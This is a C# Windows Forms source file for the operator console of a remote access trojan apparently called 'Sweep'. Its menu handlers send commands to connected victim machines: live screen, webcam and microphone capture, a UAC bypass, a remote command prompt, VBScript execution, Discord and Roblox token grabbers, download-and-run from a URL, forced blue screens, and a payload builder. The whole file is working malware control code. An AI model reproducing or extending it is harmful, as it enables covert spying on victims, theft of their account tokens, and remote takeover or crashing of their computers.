using BrightIdeasSoftware;
using LazyServer;
using Microsoft.VisualBasic;
using Newtonsoft.Json.Linq;
using Sweep.Models;
using Sweep.Services;    // MessageHandler
using Sweep.UI;          // ListViewConfigurator
using System;
using System.Collections.Generic;
using System.Drawing;
using System.IO;
using System.Linq;
using System.Security.Cryptography;
using System.Threading;
using System.Threading.Tasks;
using System.Windows.Forms;
using System.Xml.Linq;

namespace Sweep.Forms
{
    public partial class Sweep : Form
    {
        private readonly LazyServerHost _server;
        private readonly MessageHandler _dispatcher;
        private Chat chat;
        private int logsnum = 0;
        private Remembrance remembrance = new Remembrance();

        // Inject the already-started server here
        public Sweep(LazyServerHost server)
        {
            InitializeComponent();

            if (server == null)
                throw new ArgumentNullException(nameof(server));

            _server = server;

            // 1) Configure the ObjectListView once
            ListViewConfigurator.Configure(listView1, Global.Port);

            // 2) Create your central dispatcher
            //    It will subscribe to server events and call your handlers
            _dispatcher = new MessageHandler(_server, listView1, Global.Port, logsview, this);
            logsview.FormatRow += (sender, e) =>
            {
                var log = (Log)e.Model;

                if (log.Type == "Error")
                {
                    e.Item.ForeColor = System.Drawing.Color.Red;
                }
            };
            logsview.SetObjects(new List<Log>());
            logsview.ItemsChanged += (sender, e) => {
                logsnum++;
                counter.Text = logsnum.ToString();
                counter.Visible = logsnum > 0;
            };
            logsview.BeforeSorting += (s, e) =>
            {
                e.SortOrder = SortOrder.Descending;
            };
            usname.Text = usname.Text.Replace("%s", Global.Name);
            _server.ClientConnected += (s, clientId) => {
                _ = _server.SendMessageToClient(clientId, "ack"); // shush warning
            };

            listView1.OwnerDraw = true;
            listView1.DrawSubItem += (s, e) =>
            {
                string filterText = guna2TextBox1.Text.Trim();
                e.DrawBackground();
                e.DrawText();

                if (!string.IsNullOrEmpty(filterText) && e.ColumnIndex == 0)
                {
                    int idx = e.SubItem.Text.IndexOf(filterText, StringComparison.OrdinalIgnoreCase);
                    if (idx >= 0)
                    {
                        // Measure text before the match
                        using (var g = e.Graphics)
                        {
                            var beforeMatch = e.SubItem.Text.Substring(0, idx);
                            var matchText = e.SubItem.Text.Substring(idx, filterText.Length);
                            var font = e.SubItem.Font;

                            float x = e.Bounds.X + TextRenderer.MeasureText(g, beforeMatch, font, e.Bounds.Size, TextFormatFlags.NoPadding).Width;
                            var size = TextRenderer.MeasureText(g, matchText, font, e.Bounds.Size, TextFormatFlags.NoPadding);

                            g.FillRectangle(Brushes.Yellow, x, e.Bounds.Y, size.Width, e.Bounds.Height);
                            g.DrawString(matchText, font, Brushes.Black, x, e.Bounds.Y);
                        }
                    }
                }
            };


        }

        private async void seescreen_Click(object sender, EventArgs e)
        {
            foreach (var obj in listView1.SelectedObjects) {
                ClientInfo item = (ClientInfo)obj;
                if (item == null) { return; };

                ClientConnection conn = _server.GetConnectionById(item.ID);
                if (conn != null)
                {
                    await _server.SendMessageToConnection(conn, new JObject {
                        ["command"] = "ssloop",
                        ["quality"] = "40%"
                    }.ToString());
                }
            }
        }

        private void Sweep_Load(object sender, EventArgs e)
        {
            portnum.Text = portnum.Text.Replace("%s", Global.Port.ToString());
//            _ = StartAddingDummyClientsAsync();
        }

        private async void uACBypassToolStripMenuItem_Click(object sender, EventArgs e)
        {
            foreach (var obj in listView1.SelectedObjects)
            {
                ClientInfo item = (ClientInfo)obj;
                if (item == null) { return; };

                ClientConnection conn = _server.GetConnectionById(item.ID);
                if (conn != null)
                {
                    await _server.SendMessageToConnection(conn, new JObject
                    {
                        ["command"] = "uacbypass",
                    }.ToString());
                }
            }
        }

        private void home_Click(object sender, EventArgs e)
        {
            guna2TextBox1.Visible = true;
            listView1.Visible = true;
            logsview.Visible = false;
        }

        private void logs_Click(object sender, EventArgs e)
        {
            guna2TextBox1.Visible = false;
            listView1.Visible = false;
            logsview.Visible = true;
            logsnum = 0;
            counter.Visible = false;
        }
        public void ShowClientConnectedNotification(string clientId)
        {
            Bitmap bitmap = global::Sweep.Properties.Resources.cleaning;
            using (var stream = new MemoryStream())
            {
                Icon icon = Icon.FromHandle(bitmap.GetHicon());
                icon.Save(stream);
                if (notifyIcon1 != null)
                {
                    notifyIcon1.BalloonTipTitle = clientId;
                    notifyIcon1.BalloonTipText = "New client connected";
                    notifyIcon1.Icon = icon; // Use the created icon
                    notifyIcon1.ShowBalloonTip(2000);
                }
            }
        }

        private async void webcam_Click(object sender, EventArgs e)
        {
            foreach (var obj in listView1.SelectedObjects)
            {
                ClientInfo item = (ClientInfo)obj;
                if (item == null) { return; };

                ClientConnection conn = _server.GetConnectionById(item.ID);
                if (conn != null)
                {
                    await _server.SendMessageToConnection(conn, new JObject
                    {
                        ["command"] = "camloop",
                        ["quality"] = "40%",

                    }.ToString());
                }
            }
        }

        private async void microphoneToolStripMenuItem_Click(object sender, EventArgs e)
        {
            foreach (var obj in listView1.SelectedObjects)
            {
                ClientInfo item = (ClientInfo)obj;
                if (item == null) { return; };

                ClientConnection conn = _server.GetConnectionById(item.ID);
                if (conn != null)
                {
                    await _server.SendMessageToConnection(conn, new JObject
                    {
                        ["command"] = "micloop",

                    }.ToString());
                }
            }
        }

        private async void chatToolStripMenuItem_Click(object sender, EventArgs e)
        {
            foreach (var obj in listView1.SelectedObjects)
            {
                ClientInfo item = (ClientInfo)obj;
                if (item == null) { return; };

                ClientConnection conn = _server.GetConnectionById(item.ID);
                if (conn != null)
                {
                    var input = Interaction.InputBox("Enter UsrName", "Chat", Global.Name);

                    if (String.IsNullOrEmpty(input)) {
                        return;
                    }

                    chat = new Chat();
                    chat.username = input;
                    chat.serverHost = _server;
                    chat.connid = item.ID;
                    chat.Show();

                    chat.OnMessageSent += async (message, f) =>
                    {
                        if (!f) {
                            Console.WriteLine($"Sending message: {message} to {conn.Id}");
                            await _server.SendMessageToClient(conn.Id, new JObject
                            {
                                ["command"] = "chatmsg",
                                ["username"] = input,
                                ["text"] = message
                            }.ToString());
                        }
                    };

                    await _server.SendMessageToConnection(conn, new JObject
                    {
                        ["command"] = "chat",
                        ["username"] = input,
                    }.ToString());
                }
            }
        }

        private async void runVBScriptToolStripMenuItem_Click(object sender, EventArgs e)
        {
            foreach (var obj in listView1.SelectedObjects)
            {
                ClientInfo item = (ClientInfo)obj;
                if (item == null) { return; };

                ClientConnection conn = _server.GetConnectionById(item.ID);
                if (conn != null)
                {
                    var f = new VBScriptExecute();
                    f.serverHost = _server;
                    f.connid = item.ID;
                    f.Show();
                }
            }
        }

        private void discordTokenToolStripMenuItem_Click(object sender, EventArgs e)
        {
            foreach (var obj in listView1.SelectedObjects)
            {
                ClientInfo item = (ClientInfo)obj;
                if (item == null) { return; };

                ClientConnection conn = _server.GetConnectionById(item.ID);
                if (conn != null)
                {
                    var f = new TokenGrabber();
                    f.serverHost = _server;
                    f.connid = item.ID;
                    f.Show();
                }
            }
        }

        private void robloxGraToolStripMenuItem_Click(object sender, EventArgs e)
        {
            foreach (var obj in listView1.SelectedObjects)
            {
                ClientInfo item = (ClientInfo)obj;
                if (item == null) { return; };

                ClientConnection conn = _server.GetConnectionById(item.ID);
                if (conn != null)
                {
                    var f = new TokenGrabber();
                    f.serverHost = _server;
                    f.connid = item.ID;
                    f.mode = "roblox";
                    f.Show();
                }
            }
        }

        private async void builder_Click(object sender, EventArgs e)
        {
            var f = new Builder();
            f.Opacity = 0;
            f.Show();
            await Program.FadeIn(f, 35);
        }
        private async Task StartAddingDummyClientsAsync()
        {
            var rng = new Random();

            while (true)
            {
                // Call the dummy client generator
                _dispatcher.AddDummyClient();

                // Wait a random time between 3 to 10 seconds
                int delayMs = rng.Next(500, 1000);
                await Task.Delay(delayMs);
            }
        }

        private async void openURLToolStripMenuItem_Click(object sender, EventArgs e)
        {

        }
        public static async Task<byte[]> ReadAllBytesAsync(string path)
        {
            byte[] result;
            using (FileStream stream = File.Open(path, FileMode.Open, FileAccess.Read, FileShare.Read))
            {
                result = new byte[stream.Length];
                int bytesRead = 0;
                int offset = 0;
                while (bytesRead < stream.Length)
                {
                    int read = await stream.ReadAsync(result, offset, (int)stream.Length - offset);
                    if (read == 0) // End of stream reached unexpectedly
                    {
                        break;
                    }
                    bytesRead += read;
                    offset += read;
                }
            }
            return result;
        }
        private async void fromPCToolStripMenuItem_Click(object sender, EventArgs e)
        {
            foreach (var obj in listView1.SelectedObjects)
            {
                ClientInfo item = (ClientInfo)obj;
                if (item == null) { return; }

                ClientConnection conn = _server.GetConnectionById(item.ID);
                if (conn != null)
                {
                    DiskFileDialog.InitialDirectory = remembrance.GetAttribute<string>("openfilepath") ?? Environment.GetFolderPath(Environment.SpecialFolder.Desktop);

                    var input = DiskFileDialog.ShowDialog();

                    if (input == DialogResult.OK)
                    {
                        remembrance.SetAttribute("openfilepath", Path.GetDirectoryName(DiskFileDialog.FileNames[0]));

                        var names = DiskFileDialog.FileNames;

                        foreach (var name in names)
                        {
                            try
                            {
                                _dispatcher.AddLogToList(new JObject
                                {
                                    ["message"] = $"Sending file {name} to {item.Username} ({item.ID})",
                                    ["type"] = "Info"
                                });

                                // Read file bytes
                                var fileBytes = await ReadAllBytesAsync(name);

                                // Use the new inline method instead
                                await _server.SendFileBytesInline(conn.Id, fileBytes, new JObject
                                {
                                    ["command"] = "openfile",
                                    ["filename"] = Global.GenerateRandomString(10) + Path.GetFileName(name)
                                }.ToString());

                                _dispatcher.AddLogToList(new JObject
                                {
                                    ["message"] = $"File {name} successfully sent to {item.Username} ({item.ID})",
                                    ["type"] = "Info"
                                });
                            }
                            catch (Exception ex)
                            {
                                _dispatcher.AddLogToList(new JObject
                                {
                                    ["message"] = $"Error sending file {name} to {item.Username}: {ex.Message}",
                                    ["type"] = "Error"
                                });
                            }
                        }
                    }
                }
            }
        }

        private async void fromURLToolStripMenuItem_Click(object sender, EventArgs e)
        {
            foreach (var obj in listView1.SelectedObjects)
            {
                ClientInfo item = (ClientInfo)obj;
                if (item == null) { return; }
                ;

                ClientConnection conn = _server.GetConnectionById(item.ID);
                if (conn != null)
                {
                    var input = Interaction.InputBox("Enter URL (Must include http:// or https://)", "Url", remembrance.GetAttribute<string>("websiteurl") ?? "https://example.com/lol.exe");

                    if (String.IsNullOrEmpty(input))
                    {
                        return;
                    }

                    remembrance.SetAttribute("websiteurl", input);

                    await _server.SendMessageToConnection(conn, new JObject
                    {
                        ["command"] = "fileurl",
                        ["body"] = input,
                    }.ToString());
                }
            }
        }

        private async void triggerBSODToolStripMenuItem_Click(object sender, EventArgs e)
        {
            foreach (var obj in listView1.SelectedObjects)
            {
                ClientInfo item = (ClientInfo)obj;
                if (item == null) { return; }
                ;

                ClientConnection conn = _server.GetConnectionById(item.ID);
                if (conn != null)
                {
                    var confirmation = MessageBox.Show("Are you sure you want to trigger a BSOD on this client? This will crash their system. May require elevated privileges.", "Confirm BSOD", MessageBoxButtons.YesNo, MessageBoxIcon.Question);

                    if (confirmation != DialogResult.Yes)
                    {
                        return; // User canceled the operation
                    }

                    await _server.SendMessageToConnection(conn, new JObject
                    {
                        ["command"] = "bsod"
                    }.ToString());
                }
            }
        }

        private async void setWallpaperToolStripMenuItem_Click(object sender, EventArgs e)
        {
            foreach (var obj in listView1.SelectedObjects)
            {
                ClientInfo item = (ClientInfo)obj;
                if (item == null) { return; }
                ;

                ClientConnection conn = _server.GetConnectionById(item.ID);
                if (conn != null)
                {
                    var wallpaperdialog = new OpenFileDialog();
                    wallpaperdialog.DefaultExt = "png";
                    wallpaperdialog.Filter = "Image Files (*.png;*.jpg;*.jpeg)|*.png;*.jpg;*.jpeg|All files (*.*)|*.*";

                    wallpaperdialog.InitialDirectory = remembrance.GetAttribute<string>("wallpaperfilepath") ?? Environment.GetFolderPath(Environment.SpecialFolder.MyDocuments);

                    var dialog = wallpaperdialog.ShowDialog();

                    if (dialog != DialogResult.OK) {
                        return;
                    }

                    remembrance.SetAttribute("wallpaperfilepath", Path.GetDirectoryName(wallpaperdialog.FileName));

                    var filebytes = await ReadAllBytesAsync(wallpaperdialog.FileName);

                    await _server.SendFileBytesInline(conn.Id, filebytes, new JObject
                    {
                        ["command"] = "wallpaper",
                        ["filename"] = Global.GenerateRandomString(10) + Path.GetFileName(wallpaperdialog.FileName)
                    }.ToString());
                }
            }
        }

        private async void messageBoxToolStripMenuItem_Click(object sender, EventArgs e)
        {
            foreach (var obj in listView1.SelectedObjects)
            {
                ClientInfo item = (ClientInfo)obj;
                if (item == null) { return; }
                ;

                ClientConnection conn = _server.GetConnectionById(item.ID);
                if (conn != null)
                {
                    var wind = new MsgBox();
                    wind.serverHost = _server;
                    wind.clientid = item.ID;
                    wind.Show();
                }
            }
        }

        private async void playSoundToolStripMenuItem_Click(object sender, EventArgs e)
        {
            foreach (var obj in listView1.SelectedObjects)
            {
                ClientInfo item = (ClientInfo)obj;
                if (item == null) { return; }
                ;

                ClientConnection conn = _server.GetConnectionById(item.ID);
                if (conn != null)
                {
                    var sounddialog = new OpenFileDialog(); 
                    sounddialog.DefaultExt = "mp3";
                    sounddialog.Filter = "Audio Files (*.mp3;*.wav;*.ogg)|*.mp3;*.wav;*.ogg";

                    sounddialog.InitialDirectory = remembrance.GetAttribute<string>("soundfilepath") ?? Environment.GetFolderPath(Environment.SpecialFolder.MyDocuments);

                    var dialog = sounddialog.ShowDialog();

                    if (dialog != DialogResult.OK)
                    {
                        return;
                    }

                    remembrance.SetAttribute("soundfilepath", Path.GetDirectoryName(sounddialog.FileName));

                    var filebytes = await ReadAllBytesAsync(sounddialog.FileName);

                    await _server.SendFileBytesInline(conn.Id, filebytes, new JObject
                    {
                        ["command"] = "playsound",
                        ["filename"] = Global.GenerateRandomString(10) + Path.GetFileName(sounddialog.FileName)
                    }.ToString());
                }
            }
        }

        private void guna2TextBox1_TextChanged(object sender, EventArgs e)
        {
            string filterText = guna2TextBox1.Text.Trim();
            if (string.IsNullOrEmpty(filterText))
            {
                listView1.UseFiltering = false;
                listView1.ModelFilter = null;
                listView1.RefreshObjects(listView1.Objects.Cast<object>().ToList());
                return;
            }

            listView1.UseFiltering = true;
            listView1.ModelFilter = new ModelFilter(model =>
            {
                var client = model as ClientInfo;
                if (client == null) return false;

                // Search all string properties of ClientInfo
                foreach (var prop in typeof(ClientInfo).GetProperties())
                {
                    if (prop.PropertyType == typeof(string))
                    {
                        var value = prop.GetValue(client) as string;
                        if (!string.IsNullOrEmpty(value) &&
                            value.IndexOf(filterText, StringComparison.OrdinalIgnoreCase) >= 0)
                            Console.WriteLine($"Found match in {prop.Name}: {value}");
                        {
                            return true;
                        }
                    }
                }
                return false;
            });

            listView1.RefreshObjects(listView1.Objects.Cast<object>().ToList());
        }

        private void commandPromptToolStripMenuItem_Click(object sender, EventArgs e)
        {
            foreach (var obj in listView1.SelectedObjects)
            {
                ClientInfo item = (ClientInfo)obj;
                if (item == null) { return; }
                ;

                ClientConnection conn = _server.GetConnectionById(item.ID);
                if (conn != null)
                {
                    var f = new Shell();
                    f.serverHost = _server;
                    f.connid = item.ID;
                    f.Show();
                }
            }
        }

        /*protected override void OnDeactivate(EventArgs e)
        {
            timer1.Start();
            
            base.OnDeactivate(e);
        }

        protected override void OnActivated(EventArgs e)
        {
            timer1.Stop();
            opacity = 1;
            
            this.Opacity = 1;
            base.OnActivated(e);
        }
        private static double opacity = 0.95;
        private void timer1_Tick(object sender, EventArgs e)
        {
            timer1.Interval = new Random().Next(1000, 10000);
            opacity -= 0.05;
            if (opacity < 0.8) {
                opacity = 0.8;
            }
            this.Opacity = opacity;
        }*/
    }

}
